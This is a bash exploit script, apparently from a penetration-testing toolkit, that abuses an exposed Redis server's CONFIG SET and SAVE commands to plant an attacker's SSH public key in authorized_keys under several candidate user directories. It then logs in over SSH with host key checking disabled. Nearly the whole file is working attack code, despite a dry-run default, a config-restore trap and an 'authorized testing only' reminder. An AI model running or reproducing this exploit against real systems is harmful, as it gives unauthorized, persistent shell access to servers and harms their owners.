#!/usr/bin/env bash
# redis-rce-ssh.sh — drop attacker SSH key via Redis CONFIG SET / SAVE primitive.
#
# Mechanism:
#   1. AUTH (if needed)
#   2. Save current dir + dbfilename + appendonly
#   3. Try each candidate .ssh dir until SAVE succeeds (means Redis user has write access)
#   4. SET payload to "\n\n<pubkey>\n\n" — leading newlines escape any leading binary garbage
#      in the RDB header, trailing newlines isolate from any trailing garbage
#   5. CONFIG SET dir <ssh-dir>; CONFIG SET dbfilename authorized_keys; BGREWRITEAOF off; SAVE
#   6. Restore original config
#   7. Optionally attempt ssh -i <privkey> <user>@<target>
#
# Note: the resulting authorized_keys WILL contain RDB binary cruft around the key,
# but most sshd parsers ignore lines they don't recognize, so the pubkey line is parsed.
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_redis_lib.sh"

TARGET=""
PASS=""
PUBKEY_FILE=""
PUBKEY_INLINE=""
SSH_USERS="root redis ubuntu admin centos debian ec2-user"  # candidate users to try
SSH_DIRS=""  # auto-detect if empty
NO_VERIFY=0
# shellcheck disable=SC2034  # parsed by --keep; TODO: skip the restore_config step at script end when set
KEEPALIVE=0
WRITE=0

# shellcheck disable=SC2034  # PASS read transitively by _redis_lib.sh's rcmd/rscript; KEEPALIVE: see TODO above
while [ $# -gt 0 ]; do
    case "$1" in
        --target)     TARGET="$2"; shift 2 ;;
        --pass|-p)    PASS="$2";   shift 2 ;;
        --key|-k)     PUBKEY_FILE="$2"; shift 2 ;;
        --key-inline) PUBKEY_INLINE="$2"; shift 2 ;;
        --users)      SSH_USERS="$2"; shift 2 ;;
        --dirs)       SSH_DIRS="$2"; shift 2 ;;
        --no-verify)  NO_VERIFY=1; shift ;;
        --keep)       KEEPALIVE=1; shift ;;  # leave authorized_keys in place even after run
        --write)      WRITE=1; shift ;;
        -h|--help)
            cat <<EOF
Usage: $0 --target <host:port> --key <pubkey-file> --write [options]

Required:
  --target IP:PORT        Redis target (e.g. 10.0.0.20:6379)
  --key FILE              path to YOUR ssh public key
   (or)
  --key-inline 'ssh-...'  raw public key string
  --write                 REQUIRED to actually drop authorized_keys. Without it the
                          script prints what it would do and exits 0.
                          Per CLAUDE.md §9 invariant 1.

Options:
  --pass PASSWORD         redis AUTH password
  --users 'a b c'         space-sep usernames to try via ssh (default: $SSH_USERS)
  --dirs 'd1 d2 ...'      override candidate .ssh dirs to write into
  --no-verify             don't attempt ssh login after dropping key
  --keep                  leave authorized_keys file in place after exit
                          (default: file is left but config is reverted)
  -h, --help
EOF
            exit 0 ;;
        *) err "unknown arg: $1"; exit 1 ;;
    esac
done

[ -z "$TARGET" ] && { err "--target required"; exit 1; }
parse_target "$TARGET"
if [ "$WRITE" != 1 ]; then
    log "DRY RUN — would attempt to drop pubkey into authorized_keys via CONFIG SET + SAVE on $HOST:$PORT"
    log "  pubkey-source: ${PUBKEY_FILE:-${PUBKEY_INLINE:+inline}}"
    log "  users:         $SSH_USERS"
    log "  dirs:          ${SSH_DIRS:-(auto-detect)}"
    log ""
    log "  Re-run with --write to actually mutate the target's filesystem. Authorized testing only."
    exit 0
fi

if [ -n "$PUBKEY_FILE" ]; then
    [ ! -r "$PUBKEY_FILE" ] && { err "pubkey not readable: $PUBKEY_FILE"; exit 1; }
    PUBKEY=$(cat "$PUBKEY_FILE")
elif [ -n "$PUBKEY_INLINE" ]; then
    PUBKEY="$PUBKEY_INLINE"
else
    err "--key or --key-inline required"; exit 1
fi

# Cleanup trap — always restore config
SAVED_DIR=""; SAVED_DBFILE=""; SAVED_AOF=""
on_exit() {
    if [ -n "$SAVED_DIR" ]; then
        log "Restoring original Redis config"
        restore_config
    fi
}
trap on_exit EXIT INT TERM

probe_redis || { err "redis unreachable at $HOST:$PORT"; exit 2; }
if [ "$AUTH_REQUIRED" = 1 ] && [ "$AUTHED" = 0 ]; then
    err "AUTH required and no working password supplied"; exit 3
fi
hit "Connected to $HOST:$PORT  (v${REDIS_VERSION:-?})"

save_config
log "Saved config — dir='$SAVED_DIR' dbfilename='$SAVED_DBFILE' appendonly='$SAVED_AOF'"

# Build key payload — pad with newlines so RDB header binary noise doesn't merge into the key line
KEY_BLOB=$'\n\n\n'"$PUBKEY"$'\n\n\n'

# Candidate .ssh dirs to try
if [ -z "$SSH_DIRS" ]; then
    SSH_DIRS="/root/.ssh /var/lib/redis/.ssh /home/redis/.ssh /home/ubuntu/.ssh /home/ec2-user/.ssh /home/admin/.ssh /home/debian/.ssh"
fi

SUCCESS_DIR=""
for d in $SSH_DIRS; do
    log "Trying dir=$d"
    # NOTE: we deliberately do NOT FLUSHALL here. Wiping the target's keyspace is
    # destructive and unrecoverable (violates CLAUDE.md §1 / OPSEC §9). It is also
    # unnecessary: the pubkey is padded with newlines (KEY_BLOB) so it survives as a
    # valid authorized_keys line regardless of whatever RDB cruft precedes it. If you
    # ever genuinely need a minimal RDB, gate it behind an explicit, disclosed --flush.
    rcmd SET sshpwn "$KEY_BLOB" >/dev/null
    rcmd CONFIG SET dir "$d" 2>/dev/null
    setrc=$?
    if [ "$setrc" -ne 0 ]; then
        miss "  CONFIG SET dir failed (path likely doesn't exist on target)"
        continue
    fi
    rcmd CONFIG SET dbfilename authorized_keys >/dev/null
    rcmd CONFIG SET appendonly no >/dev/null
    save_out=$(rcmd SAVE 2>&1)
    if echo "$save_out" | grep -q 'OK'; then
        hit "  SAVE OK to $d/authorized_keys"
        SUCCESS_DIR="$d"
        break
    else
        miss "  SAVE failed: $save_out"
    fi
done

if [ -z "$SUCCESS_DIR" ]; then
    err "No writable .ssh dir found. Targets tried: $SSH_DIRS"
    err "Consider supplying --dirs '/custom/path' based on INFO server output."
    exit 4
fi

# Map the chosen dir back to a likely username
case "$SUCCESS_DIR" in
    /root/.ssh)         GUESS_USER=root ;;
    /var/lib/redis/.ssh|/home/redis/.ssh) GUESS_USER=redis ;;
    /home/*/.ssh)       GUESS_USER=$(echo "$SUCCESS_DIR" | awk -F/ '{print $3}') ;;
    *)                  GUESS_USER="" ;;
esac

hit "Drop succeeded → $SUCCESS_DIR/authorized_keys (likely user: ${GUESS_USER:-?})"

if [ "$NO_VERIFY" = 1 ]; then
    log "--no-verify set; not attempting ssh"
    exit 0
fi

if ! command -v ssh >/dev/null; then
    miss "ssh not installed; skipping verify"
    exit 0
fi

[ -n "$PUBKEY_FILE" ] && PRIVKEY="${PUBKEY_FILE%.pub}"
if [ -z "${PRIVKEY:-}" ] || [ ! -r "$PRIVKEY" ]; then
    miss "no matching private key found (looked for ${PUBKEY_FILE%.pub}); skipping ssh test"
    exit 0
fi

USERS_TO_TRY="$SSH_USERS"
[ -n "$GUESS_USER" ] && USERS_TO_TRY="$GUESS_USER $SSH_USERS"   # prefer guess

for u in $USERS_TO_TRY; do
    log "ssh -i $PRIVKEY $u@$HOST"
    out=$(ssh -i "$PRIVKEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
              -o ConnectTimeout=5 -o BatchMode=yes -o PreferredAuthentications=publickey \
              "$u@$HOST" 'id; hostname; uname -a' 2>&1) && {
        hit "SSH SUCCESS as $u@$HOST"
        echo "$out"
        exit 0
    }
    miss "  $u failed: $(echo "$out" | head -1)"
done
err "SSH attempted, no user accepted the key. The file was written; the user may not be one of: $USERS_TO_TRY"
